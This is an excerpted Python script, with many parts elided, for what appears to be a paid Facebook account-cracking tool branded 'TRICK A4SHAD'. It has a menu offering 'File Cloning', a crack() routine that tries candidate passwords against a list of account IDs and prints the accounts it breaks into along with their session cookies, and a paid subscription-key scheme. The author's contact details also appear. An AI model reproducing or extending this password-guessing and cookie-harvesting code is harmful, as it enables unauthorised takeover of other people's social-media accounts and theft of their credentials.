...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mARSHAD')
...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'Arshad' and password == 'Jawad':
...
os.system('espeak -a 300 " Welcome,   to,  TRICK, ARSHAD,  Tools"')
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mTRICK A4SHAD ]\33[1;38m     ║\033[1;31m 
╠══[FB GROUP                 • TRICK A4SHAD ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mARSHAD-404-CYBER ]   ║\33[1;34m   
╠══[Whatsapp                 •  01944071767 ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
╠══[VERSION                  • 1.0 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
def login():
	banner()
	ARSHADj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	ARSHADj('\033[0;97m===============================================')
	ARSHAD= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if ARSHAD in ['m']:
		public()
	elif ARSHAD in ['1']:
		crack_file()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[ARSHAD-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#ARSHAD-King
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•ARSHAD-Cp] {idf} • {pw}')     
				...
				#ARSHAD-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•ARSHAD-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " ARSHAD,  Ok,  id"')
...
def Subscraption():
	...
	if key1 in r1:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208mTRICK A4SHAD, ToOLs Daily Update")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+ARSHAD+key1)
		...
		time.sleep(3.5)
		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ARSHAD+''+key1
